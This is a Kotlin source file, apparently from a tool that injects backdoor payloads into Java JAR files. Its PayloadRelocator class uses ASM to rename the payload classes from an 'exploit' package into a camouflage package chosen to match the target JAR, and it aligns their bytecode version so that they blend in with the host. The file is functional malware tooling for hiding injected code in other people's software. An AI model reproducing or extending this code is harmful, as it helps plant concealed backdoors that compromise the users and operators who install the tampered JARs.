package com.tmquan2508.inject.core.payload.transformation

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.core.analysis.JavaVersion
import com.tmquan2508.inject.core.analysis.JavaVersionScanner
import com.tmquan2508.inject.core.payload.Camouflage
import com.tmquan2508.inject.log.BDLogger
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.commons.ClassRemapper
import org.objectweb.asm.commons.SimpleRemapper
import java.io.File

class PayloadRelocator(
    private val camouflageGenerator: Camouflage,
    private val logger: BDLogger
) {
    private companion object {
        const val ORIGINAL_MAIN_PAYLOAD_NAME = "com/tmquan2508/exploit/Config"
        const val ORIGINAL_PACKAGE = "com/tmquan2508/exploit"
    }

    fun createRelocationPlan(
        camouflageEnabled: Boolean,
        targetJar: File,
        rawPayloadClasses: List<ClassFile>
    ): Pair<Map<String, String>, String> {
        if (!camouflageEnabled) {
            return Pair(emptyMap(), ORIGINAL_MAIN_PAYLOAD_NAME)
        }

        logger.info(" -> Camouflage enabled. Generating camouflage plan...")
        val plan = camouflageGenerator.generatePlan(targetJar)
        logger.info(" -> Selected camouflage package: '${plan.packageName}' with new base name '${plan.className}'")

        val finalMainPayloadName = "${plan.packageName}/${plan.className}"

        val relocationMap = rawPayloadClasses.associate { clazz ->
            val originalName = clazz.name
            val newName = when {
                originalName.startsWith("$ORIGINAL_MAIN_PAYLOAD_NAME$") || originalName == ORIGINAL_MAIN_PAYLOAD_NAME ->
                    finalMainPayloadName + originalName.substring(ORIGINAL_MAIN_PAYLOAD_NAME.length)
                originalName.startsWith(ORIGINAL_PACKAGE) ->
                    plan.packageName + originalName.substring(ORIGINAL_PACKAGE.length)
                else -> originalName
            }
            originalName to newName
        }
        return Pair(relocationMap, finalMainPayloadName)
    }

    fun transformAndRelocate(
        rawClasses: List<ClassFile>,
        relocationMap: Map<String, String>,
        dominantVersion: JavaVersion
    ): Map<String, ByteArray> {
        if (relocationMap.isEmpty()) {
            return rawClasses.associate { it.name to it.compile() }
        }

        val remapper = SimpleRemapper(relocationMap)
        val transformedBytecode = mutableMapOf<String, ByteArray>()

        logger.info(" -> Transforming and relocating payload classes with ASM...")
        rawClasses.forEach { classFile ->
            val originalName = classFile.name
            val newName = relocationMap[originalName] ?: originalName

            val reader = ClassReader(classFile.compile())
            val writer = ClassWriter(ClassWriter.COMPUTE_FRAMES)
            val classRemapper = ClassRemapper(writer, remapper)
            reader.accept(classRemapper, ClassReader.EXPAND_FRAMES)
            val finalBytecode = writer.toByteArray()
            JavaVersionScanner.setClassVersion(finalBytecode, dominantVersion)

            transformedBytecode[newName] = finalBytecode
            logger.debug("  [ASM-REMAP] '${originalName}' -> '${newName}'")
        }
        return transformedBytecode
    }
}